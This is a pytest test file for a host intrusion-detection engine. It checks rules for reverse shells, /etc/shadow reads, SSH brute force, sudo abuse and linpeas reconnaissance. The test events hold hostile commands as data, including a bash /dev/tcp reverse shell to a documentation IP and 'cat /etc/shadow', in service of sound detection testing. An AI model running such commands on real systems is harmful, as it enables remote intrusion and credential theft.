import pytest
from datetime import datetime, timedelta
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from backend.app.database.connection import Base
from backend.app.models.event import Event
from backend.app.models.detection import Detection
from backend.app.detection.engine import detection_engine
from backend.app.detection.ssh import SSHBruteForceRule
from backend.app.detection.privilege import PrivilegeEscalationRule, SensitiveFileAccessRule
from backend.app.detection.process import ReverseShellRule, ReconnaissanceToolRule
from backend.app.detection.network import PortScanActivityRule

TEST_DATABASE_URL = "sqlite:///:memory:"
engine = create_engine(TEST_DATABASE_URL, connect_args={"check_same_thread": False})
TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)

@pytest.fixture(autouse=True)
def setup_db():
    Base.metadata.create_all(bind=engine)
    yield
    Base.metadata.drop_all(bind=engine)

def test_reverse_shell_detection():
    db = TestingSessionLocal()
    rule = ReverseShellRule()

    ev = Event(
        hostname="test-host",
        timestamp=datetime.utcnow(),
        event_type="process",
        action="execve",
        status="success",
        command="bash -i >& /dev/tcp/198.51.100.42/4444 0>&1",
        raw_message="auditd: execve bash -i >& /dev/tcp/198.51.100.42/4444"
    )
    db.add(ev)
    db.commit()

    results = rule.evaluate(ev, db)
    assert len(results) > 0
    res = results[0]
    assert res.severity == "CRITICAL"
    assert res.mitre_technique_id == "T1059.004"
    db.close()

def test_shadow_access_detection():
    db = TestingSessionLocal()
    rule = SensitiveFileAccessRule()

    ev = Event(
        hostname="test-host",
        timestamp=datetime.utcnow(),
        event_type="process",
        action="execve",
        status="success",
        command="cat /etc/shadow",
        raw_message="auditd: cat /etc/shadow"
    )
    db.add(ev)
    db.commit()

    results = rule.evaluate(ev, db)
    assert len(results) > 0
    res = results[0]
    assert res.mitre_technique_id == "T1003.008"
    db.close()

def test_ssh_brute_force_detection():
    db = TestingSessionLocal()
    rule = SSHBruteForceRule()
    base_time = datetime.utcnow()

    # Add 3 failed attempts
    for i in range(3):
        ev = Event(
            hostname="test-host",
            source_ip="198.51.100.99",
            timestamp=base_time + timedelta(seconds=i * 10),
            event_type="authentication",
            action="ssh_login",
            status="failed",
            username="root",
            raw_message="sshd[1234]: Failed password for root from 198.51.100.99 port 54321 ssh2"
        )
        db.add(ev)
        db.commit()
        res = rule.evaluate(ev, db)
        assert len(res) == 0

    # 4th failed attempt within 10 min window -> triggers rule!
    ev4 = Event(
        hostname="test-host",
        source_ip="198.51.100.99",
        timestamp=base_time + timedelta(seconds=40),
        event_type="authentication",
        action="ssh_login",
        status="failed",
        username="admin",
        raw_message="sshd[1235]: Failed password for admin from 198.51.100.99 port 54322 ssh2"
    )
    db.add(ev4)
    db.commit()

    results = rule.evaluate(ev4, db)
    assert len(results) > 0
    res = results[0]
    assert res.mitre_technique_id == "T1110.001"
    db.close()

def test_sudo_abuse_detection():
    db = TestingSessionLocal()
    rule = PrivilegeEscalationRule()

    ev = Event(
        hostname="test-host",
        timestamp=datetime.utcnow(),
        event_type="privilege",
        action="sudo_exec",
        status="failed",
        username="deployer",
        raw_message="sudo: deployer : 3 incorrect password attempts"
    )
    db.add(ev)
    db.commit()

    results = rule.evaluate(ev, db)
    assert len(results) > 0
    res = results[0]
    assert res.mitre_technique_id == "T1548.003"
    db.close()

def test_automated_recon_tool_detection():
    db = TestingSessionLocal()
    rule = ReconnaissanceToolRule()

    ev = Event(
        hostname="test-host",
        timestamp=datetime.utcnow(),
        event_type="process",
        action="execve",
        status="success",
        command="./linpeas.sh -a",
        raw_message="auditd: type=EXECVE args=\"./linpeas.sh -a\""
    )
    db.add(ev)
    db.commit()

    results = rule.evaluate(ev, db)
    assert len(results) > 0
    res = results[0]
    assert res.mitre_technique_id == "T1082"
    db.close()
